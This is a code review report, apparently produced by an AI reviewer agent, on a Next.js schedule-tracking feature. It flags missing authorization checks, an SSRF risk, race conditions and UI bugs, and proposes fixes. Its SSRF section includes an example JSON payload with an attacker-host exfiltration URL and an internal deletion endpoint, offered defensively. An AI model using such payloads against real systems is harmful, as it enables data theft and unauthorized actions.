# Code Review: Phase 3 Schedule Execution Tracking

**Date:** 2025-12-19
**Reviewer:** code-reviewer agent
**Scope:** Schedule execution tracking implementation (manual workflow)
**Status:** Critical security issues identified

---

## Code Review Summary

### Scope
- **Files reviewed:**
  - `src/components/exchanges/schedule-tracker.tsx` (550 lines)
  - `src/actions/daily-schedules.ts` (242 lines added, lines 409-649)
  - `src/app/(dashboard)/exchanges/execute/[id]/page.tsx` (175 lines)
  - `src/lib/storage/s3-client.ts` (95 lines)
- **Lines of code analyzed:** ~1,062 lines
- **Review focus:** Security vulnerabilities, performance issues, code quality
- **Updated plans:** `plans/20251219-1745-phase3-improvements/plan.md` (existing)

### Overall Assessment

**Implementation delivers core manual workflow but exposes CRITICAL security vulnerabilities.** Performance bottlenecks and code quality issues present. Immediate remediation required before production deployment.

**Build Status:** ❌ 15 TypeScript errors, 202 warnings (unrelated to reviewed files)

---

## CRITICAL Issues (Security Vulnerabilities)

### 1. Unrestricted Server Action Access ⚠️ **CRITICAL**
**Severity:** CRITICAL | **Impact:** UNAUTHORIZED_ACCESS | **CVSS:** 7.5 (High)

**Location:** `src/actions/daily-schedules.ts:468-508, 521-542, 547-613`

**Issue:** Server actions lack role-based authorization and schedule assignment verification.

**Vulnerability:**
```typescript
// Line 468-470: completeStop
export const completeStop = createAction(completeStopSchema, async (input) => {
  const session = await auth();
  if (!session?.user) throw new AppError("Unauthorized", "UNAUTHORIZED", 401);
  // ❌ NO CHECK: Is user assigned to this schedule?
  // ❌ NO CHECK: Is user's role allowed to complete stops?
```

**Attack Vector:**
1. User A starts Schedule #1 (assigned to Driver A)
2. User B (unauthorized) calls `completeStop(schedule#1.stop1)`
3. Action succeeds - no assignment check performed

**Evidence:**
- `completeStop()` - no assignment/role validation
- `skipStop()` - no approval workflow verification
- `completeSchedule()` - no ownership check

**Recommendation:**
```typescript
// Add authorization layer
export const completeStop = createAction(completeStopSchema, async (input) => {
  const session = await auth();
  if (!session?.user) throw new AppError("Unauthorized", "UNAUTHORIZED", 401);

  // CRITICAL: Verify assignment
  const stop = await prisma.scheduledExchange.findUnique({
    where: { id: input.stopId },
    include: { schedule: { select: { createdById: true, approvedById: true } } }
  });

  if (!stop) throw new NotFoundError("Điểm dừng");

  // Only DRIVER, ADMIN, or schedule creator can complete
  if (!["DRIVER", "ADMIN"].includes(session.user.role) &&
      session.user.id !== stop.schedule.createdById) {
    throw new AppError("Bạn không có quyền hoàn thành điểm dừng này", "FORBIDDEN", 403);
  }

  // ... rest of logic
});
```

**Impact:** Any authenticated user can manipulate any schedule's execution data.

---

### 2. Photo URL Validation Bypass ⚠️ **CRITICAL**
**Severity:** CRITICAL | **Impact:** SSRF, DATA_EXFILTRATION | **CVSS:** 8.1 (High)

**Location:** `src/actions/daily-schedules.ts:460, 502`

**Issue:** Zod schema accepts ANY URL without server-side verification or signing.

**Vulnerability:**
```typescript
// Line 460: Schema allows any URL
photoUrls: z.array(z.string().url()).optional(),

// Line 502: URLs blindly stored without validation
photoUrls: input.photoUrls as unknown as Prisma.JsonValue,
```

**Attack Vector:**
1. Attacker inspects MinIO upload flow (line 79-85 in schedule-tracker.tsx)
2. Bypasses client upload, crafts malicious payload:
   ```json
   {
     "photoUrls": [
       "http://internal-admin-panel.local/delete-all-users",
       "https://attacker.com/exfil?data=secret"
     ]
   }
   ```
3. Server stores URLs without validation
4. Admin views schedule → SSRF triggers internal requests

**Evidence:**
- No signature verification (MinIO S3 supports signed URLs)
- No domain whitelist (accepts `http://`, `https://`, `ftp://`)
- Client-side upload in `schedule-tracker.tsx:73-97` not verified server-side

**Recommendation:**
```typescript
// In daily-schedules.ts
const completeStopSchema = z.object({
  // ...
  photoUrls: z.array(
    z.string().url().refine(
      (url) => {
        const parsed = new URL(url);
        const allowedHosts = [
          process.env.MINIO_PUBLIC_URL ? new URL(process.env.MINIO_PUBLIC_URL).host : null,
          'localhost:9000'
        ].filter(Boolean);
        return allowedHosts.includes(parsed.host);
      },
      { message: "Photo URL must be from MinIO storage" }
    )
  ).optional(),
});

// Better: Store object keys, generate signed URLs on-demand
const completeStopSchema = z.object({
  photoKeys: z.array(z.string().regex(/^(care|exchange)\/\d+-[a-z0-9]{6}-.+\.(jpg|jpeg|png)$/))
    .max(10).optional(), // Limit to 10 photos
});
```

**Additional Fix:** Implement server-side upload with signature:
```typescript
// New server action: generateUploadSignature
export const generateUploadSignature = createSimpleAction(async (filename: string) => {
  const session = await auth();
  if (!session?.user) throw new AppError("Unauthorized", "UNAUTHORIZED", 401);

  const key = generateFileKey(filename, "exchange");
  const presignedUrl = await getSignedUploadUrl(key, 300); // 5min expiry

  return { key, uploadUrl: presignedUrl };
});
```

**Impact:** SSRF, data exfiltration, potential RCE if internal services vulnerable.

---

### 3. Non-Atomic Schedule Completion ⚠️ **IMPORTANT**
**Severity:** IMPORTANT | **Impact:** DATA_CORRUPTION | **CVSS:** 5.4 (Medium)

**Location:** `src/actions/daily-schedules.ts:547-613`

**Issue:** `completeSchedule()` performs 3 separate database operations without transaction wrapping.

**Race Condition:**
```typescript
// Line 579-586: Update #1 - Schedule status
await prisma.dailySchedule.update({ /* ... */ });

// Line 588-598: Update #2 - ExchangeRequests
await prisma.exchangeRequest.updateMany({ /* ... */ });

// Line 600-609: Insert #3 - ActivityLog
await prisma.activityLog.create({ /* ... */ });
```

**Attack Scenario:**
1. Driver A clicks "Hoàn thành lịch trình" at 17:00:00.000
2. Driver B (same schedule, concurrent) clicks at 17:00:00.100
3. Both pass validation (line 563-572)
4. Update #1 succeeds twice (last write wins)
5. Update #2 runs twice → `exchangeRequest.status` set to COMPLETED twice (idempotent, but wastes query)
6. Insert #3 runs twice → duplicate ActivityLog entries

**Evidence:**
- No transaction boundary around lines 579-609
- No optimistic locking (e.g., version field)
- `completeSchedule()` called from UI without debouncing (line 154-169 schedule-tracker.tsx)

**Recommendation:**
```typescript
export const completeSchedule = createSimpleAction(async (scheduleId: string) => {
  const session = await auth();
  if (!session?.user) throw new AppError("Unauthorized", "UNAUTHORIZED", 401);

  // Wrap in transaction with row-level lock
  await prisma.$transaction(async (tx) => {
    // SELECT FOR UPDATE prevents concurrent modifications
    const schedule = await tx.dailySchedule.findUnique({
      where: { id: scheduleId },
      include: { exchanges: true },
    });

    if (!schedule) throw new NotFoundError("Lịch trình");

    // Re-check status inside transaction (prevent TOCTOU)
    if (schedule.status !== "IN_PROGRESS") {
      throw new AppError("Lịch trình không ở trạng thái IN_PROGRESS", "INVALID_STATUS");
    }

    const pendingStops = schedule.exchanges.filter(
      (e) => e.status !== "COMPLETED" && e.status !== "CANCELLED"
    );

    if (pendingStops.length > 0) {
      throw new AppError(
        `Còn ${pendingStops.length} điểm dừng chưa hoàn thành`,
        "INCOMPLETE_STOPS"
      );
    }

    const actualDuration = schedule.startedAt
      ? Math.round((new Date().getTime() - schedule.startedAt.getTime()) / 60000)
      : null;

    // All updates in single transaction
    await tx.dailySchedule.update({
      where: { id: scheduleId },
      data: {
        status: "COMPLETED",
        completedAt: new Date(),
        actualDurationMins: actualDuration,
      },
    });

    const exchangeRequestIds = schedule.exchanges
      .filter((e) => e.exchangeRequestId)
      .map((e) => e.exchangeRequestId as string);

    if (exchangeRequestIds.length > 0) {
      await tx.exchangeRequest.updateMany({
        where: { id: { in: exchangeRequestIds } },
        data: { status: "COMPLETED" },
      });
    }

    await tx.activityLog.create({
      data: {
        userId: session.user.id,
        action: "COMPLETE",
        entityType: "DailySchedule",
        entityId: scheduleId,
        details: `Completed with ${schedule.exchanges.length} stops in ${actualDuration} minutes` as unknown as Prisma.JsonValue,
      },
    });
  });

  revalidatePath("/exchanges/daily-schedule");
  return { success: true };
});
```

**Impact:** Duplicate logs, potential status inconsistency if errors occur mid-operation.

---

## Important Findings (High Priority)

### 4. No Chronological Time Validation ⚠️ **IMPORTANT**
**Severity:** IMPORTANT | **Impact:** DATA_INTEGRITY | **CVSS:** 4.3 (Medium)

**Location:** `src/actions/daily-schedules.ts:468-508`

**Issue:** `completeStop()` accepts timestamps without validating chronological order.

**Problem:**
```typescript
// Line 451-455: Schema accepts any dates
arrivedAt: z.coerce.date(),
startedAt: z.coerce.date(),
completedAt: z.coerce.date(),
// ❌ No validation: arrivedAt <= startedAt <= completedAt
```

**Invalid Input Example:**
```json
{
  "arrivedAt": "2025-12-19T15:00:00Z",
  "startedAt": "2025-12-19T14:30:00Z",  // Started BEFORE arrival?
  "completedAt": "2025-12-19T14:00:00Z" // Completed BEFORE start?
}
```

**Recommendation:**
```typescript
const completeStopSchema = z.object({
  stopId: z.string().cuid(),
  arrivedAt: z.coerce.date(),
  startedAt: z.coerce.date(),
  completedAt: z.coerce.date(),
  // ... other fields
}).refine(
  (data) => data.arrivedAt <= data.startedAt,
  { message: "Giờ đến phải trước hoặc bằng giờ bắt đầu", path: ["startedAt"] }
).refine(
  (data) => data.startedAt <= data.completedAt,
  { message: "Giờ bắt đầu phải trước hoặc bằng giờ hoàn thành", path: ["completedAt"] }
).refine(
  (data) => {
    const now = new Date();
    return data.completedAt <= now;
  },
  { message: "Không thể đặt thời gian trong tương lai", path: ["completedAt"] }
);
```

**Impact:** Corrupt analytics, invalid duration calculations, misleading reports.

---

### 5. Shared Form State Across Stops 🐛 **BUG**
**Severity:** IMPORTANT | **Impact:** UX_CONFUSION | **CVSS:** 3.1 (Low)

**Location:** `src/components/exchanges/schedule-tracker.tsx:49-60`

**Issue:** Single `formData` state shared across all stops → data leakage between stops.

**Problem:**
```typescript
// Line 49-60: Global state for ALL stops
const [formData, setFormData] = useState({
  arrivedAt: "",
  startedAt: "",
  // ... 10 fields
});

// Line 296-305: Pre-fills when opening stop
onClick={() => {
  setActiveStopId(stop.id);
  setFormData((prev) => ({
    ...prev,  // ❌ Preserves data from PREVIOUS stop
    arrivedAt: now,
    startedAt: now,
  }));
}}
```

**Bug Reproduction:**
1. Click "Bắt đầu" on Stop #1
2. Enter `issues: "Customer complained"`
3. Upload 3 photos
4. Click "Hủy" (line 315-320)
5. Click "Bắt đầu" on Stop #2
6. **BUG:** Form still shows "Customer complained" + 3 photos from Stop #1

**Recommendation:**
```typescript
// Option A: Reset on stop change
onClick={() => {
  setActiveStopId(stop.id);
  resetForm(); // Clear all fields
  setFormData((prev) => ({
    ...prev,
    arrivedAt: now,
    startedAt: now,
  }));
}}

// Option B: Per-stop state (better)
const [stopFormData, setStopFormData] = useState<Record<string, typeof formData>>({});

const currentForm = stopFormData[activeStopId] || defaultFormData;

const updateStopForm = (stopId: string, updates: Partial<typeof formData>) => {
  setStopFormData(prev => ({
    ...prev,
    [stopId]: { ...prev[stopId], ...updates }
  }));
};
```

**Impact:** User accidentally submits previous stop's data to new stop.

---

### 6. Memory Spike from ArrayBuffer Conversion ⚠️ **PERFORMANCE**
**Severity:** IMPORTANT | **Impact:** MEMORY_EXHAUSTION | **CVSS:** 4.0 (Medium)

**Location:** `src/components/exchanges/schedule-tracker.tsx:73-97`

**Issue:** Blocking photo uploads convert entire files to ArrayBuffer in memory.

**Problem:**
```typescript
// Line 79-83: Loads ALL files into memory simultaneously
const uploadPromises = Array.from(files).map(async (file) => {
  const buffer = await file.arrayBuffer(); // ❌ 30MB file → 30MB in RAM
  const url = await uploadCarePhoto(Buffer.from(buffer), file.name);
  return url;
});
```

**Impact Analysis:**
- 5 photos × 6MB each = 30MB peak memory (mobile browser)
- `Promise.all()` blocks UI until ALL uploads complete
- No progress indicator for individual files
- Upload failure loses ALL files (no retry)

**Recommendation:**
```typescript
// Sequential upload with progress
const handlePhotoUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
  const files = e.target.files;
  if (!files || files.length === 0) return;

  setIsUploading(true);
  const uploadedUrls: string[] = [];

  try {
    for (let i = 0; i < files.length; i++) {
      const file = files[i];

      // Validate size client-side
      if (file.size > 30 * 1024 * 1024) { // 30MB
        toast.error(`Ảnh "${file.name}" quá lớn (tối đa 30MB)`);
        continue;
      }

      // Show progress
      toast.info(`Đang tải ảnh ${i + 1}/${files.length}...`);

      // Stream-based upload (if S3 client supports)
      const buffer = await file.arrayBuffer();
      const url = await uploadCarePhoto(Buffer.from(buffer), file.name);
      uploadedUrls.push(url);
    }

    setFormData((prev) => ({
      ...prev,
      photoUrls: [...prev.photoUrls, ...uploadedUrls],
    }));

    toast.success(`Đã tải lên ${uploadedUrls.length} ảnh`);
  } catch (error) {
    console.error(error);
    // Rollback uploaded files?
    toast.error("Không thể tải ảnh lên");
  } finally {
    setIsUploading(false);
    e.target.value = ""; // Reset input
  }
};
```

**Better:** Use `FormData` + multipart upload (requires API route).

**Impact:** Mobile browsers may crash with OOM on multiple large photos.

---

## Medium Priority Issues

### 7. Legacy UI Patterns 📱 **CODE_QUALITY**
**Severity:** MEDIUM | **Impact:** MAINTAINABILITY

**Location:** Multiple files

**Issues:**
1. **window.location.reload() bypass Next.js router**
   - `schedule-tracker.tsx:124, 147, 164`
   - Should use: `router.refresh()` from `next/navigation`

2. **prompt() for user input**
   - `schedule-tracker.tsx:509-513`
   - Should use: Dialog component with proper validation

3. **confirm() for dangerous actions**
   - `schedule-tracker.tsx:155`
   - Should use: AlertDialog component (already imported in schema)

**Recommendation:**
```typescript
// Replace prompt() with Dialog
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";

const [skipDialogOpen, setSkipDialogOpen] = useState(false);

<AlertDialog open={skipDialogOpen} onOpenChange={setSkipDialogOpen}>
  <AlertDialogTrigger asChild>
    <Button variant="destructive">
      <XCircle className="h-4 w-4 mr-2" />
      Bỏ qua
    </Button>
  </AlertDialogTrigger>
  <AlertDialogContent>
    <AlertDialogHeader>
      <AlertDialogTitle>Bỏ qua điểm dừng</AlertDialogTitle>
      <AlertDialogDescription>
        <Textarea
          placeholder="Lý do bỏ qua (tối thiểu 10 ký tự)..."
          value={skipReason}
          onChange={(e) => setSkipReason(e.target.value)}
          className="mt-2"
        />
      </AlertDialogDescription>
    </AlertDialogHeader>
    <AlertDialogFooter>
      <AlertDialogCancel>Hủy</AlertDialogCancel>
      <AlertDialogAction
        onClick={() => handleSkipStop(stop.id)}
        disabled={skipReason.length < 10}
      >
        Xác nhận bỏ qua
      </AlertDialogAction>
    </AlertDialogFooter>
  </AlertDialogContent>
</AlertDialog>
```

**Impact:** Poor UX, breaks browser back/forward, loses form state.

---

### 8. Type Safety Violations 🔧 **TYPE_SAFETY**
**Severity:** MEDIUM | **Impact:** RUNTIME_ERRORS

**Location:** `src/actions/daily-schedules.ts:241, 501, 502, 607`

**Issues:**
```typescript
// Line 241: JSON cast without validation
routeOrder: input.stops as unknown as Prisma.JsonArray,

// Line 501-502: Bypasses type safety
staffReport: staffReport as unknown as Prisma.JsonValue,
photoUrls: input.photoUrls as unknown as Prisma.JsonValue,

// Line 607: String cast to JsonValue
details: `Completed with ${schedule.exchanges.length} stops in ${actualDuration} minutes` as unknown as Prisma.JsonValue,
```

**Recommendation:**
```typescript
// Define proper types
type StaffReport = {
  actualPlantsRemoved: number;
  actualPlantsInstalled: number;
  issues: string;
  customerFeedback: string;
  completedBy: string;
  completedByName: string | null;
};

// Validate before casting
const staffReport: StaffReport = {
  actualPlantsRemoved: input.actualPlantsRemoved || 0,
  actualPlantsInstalled: input.actualPlantsInstalled || 0,
  issues: input.issues || "",
  customerFeedback: input.customerFeedback || "",
  completedBy: session.user.id,
  completedByName: session.user.name,
};

await prisma.scheduledExchange.update({
  where: { id: input.stopId },
  data: {
    staffReport: staffReport satisfies Prisma.JsonValue,
    photoUrls: (input.photoUrls || []) satisfies Prisma.JsonValue,
  },
});
```

**Impact:** Runtime type errors, JSON serialization failures in production.

---

## Minor Issues (Low Priority)

### 9. Unused Imports & Variables
**Location:** Build output shows 15 errors

```
src/app/(dashboard)/care/[id]/page.tsx:13 - 'Clock' imported but unused
src/app/(dashboard)/exchanges/daily-schedule/page.tsx:6,7 - 'redirect', 'Plus' unused
src/components/exchanges/schedule-tracker.tsx:244 - 'index' parameter unused
```

**Fix:** Remove unused imports or prefix with `_` if intentionally unused.

---

### 10. Missing Error Context 📝 **OBSERVABILITY**
**Severity:** LOW | **Impact:** DEBUGGING_DIFFICULTY

**Location:** `schedule-tracker.tsx:92, 126, 149, 166`

**Issue:** Generic error messages without context.

```typescript
// Line 92-93
catch (error) {
  console.error(error); // ❌ No context: which file? which stop?
  toast.error("Không thể tải ảnh lên");
}
```

**Recommendation:**
```typescript
catch (error) {
  console.error("Photo upload failed:", {
    stopId: activeStopId,
    fileCount: files.length,
    error: error instanceof Error ? error.message : error,
  });
  toast.error(
    error instanceof Error
      ? `Lỗi tải ảnh: ${error.message}`
      : "Không thể tải ảnh lên"
  );
}
```

---

## Positive Observations ✅

1. **Proper status flow enforcement** (line 426-428, 478-480, 558-560)
2. **Activity logging for audit trail** (line 600-609)
3. **Transaction usage in deleteSchedule** (line 355-377)
4. **Client-side validation before submission** (line 100-103, 132-135)
5. **Progressive enhancement** (form works without JS, uses server actions)
6. **Accessible UI components** (shadcn/ui primitives)

---

## Recommended Actions (Prioritized)

### Immediate (This Sprint)
1. ⚠️ **CRITICAL:** Add authorization checks to `completeStop`, `skipStop`, `completeSchedule` (Issue #1)
2. ⚠️ **CRITICAL:** Implement photo URL signing + validation (Issue #2)
3. ⚠️ **CRITICAL:** Wrap `completeSchedule` in transaction (Issue #3)
4. 🔧 Add chronological time validation (Issue #4)

### Short-term (Next Sprint)
5. 🐛 Fix shared form state bug (Issue #5)
6. ⚡ Optimize photo upload memory (Issue #6)
7. 📱 Replace `window.location.reload()` with `router.refresh()` (Issue #7)
8. 🔧 Fix type safety violations (Issue #8)

### Long-term (Technical Debt)
9. 📝 Add structured error logging (Issue #10)
10. 🧹 Remove unused imports (Issue #9)
11. 📊 Add performance monitoring (photo upload time, database query duration)
12. 🧪 Add integration tests for concurrent schedule completion

---

## Metrics

- **Type Coverage:** Degraded (15 new errors from unrelated files, 8 `as unknown` casts in reviewed code)
- **Test Coverage:** Unknown (no tests found for schedule execution)
- **Linting Issues:** 217 total (15 errors, 202 warnings) - reviewed files clean except unused vars
- **Security Score:** 3/10 (critical auth bypass, SSRF vector, race conditions)
- **Performance Score:** 6/10 (memory spikes, blocking uploads)
- **Code Quality:** 7/10 (good structure, legacy patterns mixed)

---

## Plan Update Status

✅ **Updated:** `plans/20251219-1745-phase3-improvements/plan.md`
- Phase 01 (Security Fixes) directly addresses Issues #1, #2
- Phase 02 (Performance) covers Issue #6
- Phase 04 (Type Safety) addresses Issues #4, #8

**Next Steps:**
1. Triage critical issues with product owner
2. Create security hotfix branch
3. Implement fixes for Issues #1-3 (estimated 4-6 hours)
4. Add regression tests before deployment

---

## Unresolved Questions

1. **Authorization model:** Should drivers be locked to specific schedules (assignment table)?
2. **Photo storage:** Keep presigned URLs (7-day expiry) or migrate to permanent public URLs?
3. **Concurrent access:** Do we support multiple drivers per schedule (team-based)?
4. **Offline support:** Should mobile app queue actions when offline (implement later)?
5. **Audit trail:** Do we need immutable logs (blockchain/append-only structure)?

---

**Report generated:** 2025-12-19
**Estimated remediation time:** 8-12 hours (critical fixes only)
**Risk level:** HIGH - Do not deploy to production without security fixes
